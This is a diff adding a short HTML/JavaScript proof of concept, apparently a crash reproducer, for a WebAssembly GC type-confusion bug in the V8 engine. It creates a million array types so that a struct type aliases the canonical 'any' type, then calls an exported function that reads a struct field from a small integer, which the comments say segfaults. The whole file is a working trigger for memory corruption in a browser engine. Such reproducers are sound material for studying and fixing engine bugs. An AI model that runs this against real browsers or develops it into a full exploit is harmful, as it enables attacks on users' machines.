@@ -1,0 +1,40 @@
+<script>
+{
+  const builder = new WasmModuleBuilder();
+  builder.startRecGroup();
+  for (let i = 0; i < 1000000; i++) {
+    builder.addArray(kWasmI64);
+  }
+  builder.endRecGroup();
+  builder.instantiate();
+}
+
+// confuse argument as struct (mut i32) by aliasing canonicalized type with kAny
+{
+  let builder = new WasmModuleBuilder();
+  builder.startRecGroup();
+  builder.addArray(kWasmI64); // 1000002
+  builder.addArray(kWasmI64); // 1000003
+  builder.addArray(kWasmI64); // 1000004
+  let struct = builder.addStruct([makeField(kWasmI32, true)]); // 1000005 <- kAny
+  let funcSig = builder.addType(makeSig([wasmRefType(struct)], [kWasmI32])); // 1000006
+  builder.endRecGroup();
+  builder
+    .addFunction("read", funcSig)
+    .addBody([
+      kExprLocalGet,
+      0,
+      kGCPrefix,
+      kExprStructGet,
+      struct,
+      ...wasmUnsignedLeb(0),
+    ])
+    .exportFunc();
+  const instance = builder.instantiate();
+  const wasm = instance.exports;
+
+  // this should obviously fail, instead of reading from the given JS object (or smi)
+  // instead we segfault on the smi as caged offset
+  console.log(wasm.read(0).toString(16));
+}
+    </script>
